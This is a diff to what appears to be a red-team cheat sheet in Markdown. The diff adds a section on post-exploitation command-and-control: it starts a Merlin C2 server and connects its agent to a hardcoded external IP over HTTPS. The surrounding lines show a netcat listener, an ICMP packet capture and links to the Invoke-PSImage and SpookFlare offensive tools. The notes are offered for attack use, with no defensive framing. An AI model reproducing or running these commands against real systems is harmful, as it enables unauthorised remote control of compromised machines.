@@ -8,6 +8,8 @@
 
 * Server: `tcpdump -A icmp -i lo`
 
+
+
 ## Remote Access using PSImage
 
 * PSImage: https://github.com/peewpw/Invoke-PSImage
@@ -29,6 +31,15 @@ End Sub
 ```
 * `nc -nlvp 444`
 
+
+
+## Post-Exploitation over HTTP/2 C&C
+
+* `./ merlinServer-Linux-x64 -i 46.101.222.52`
+* `./ merlinAgent-Linux-x64 -url https://46.101.222.52:443`
+ 
+ 
+ 
 ## Awsome Tools
 
 * SpookFlare: https://artofpwn.com/spookflare.html
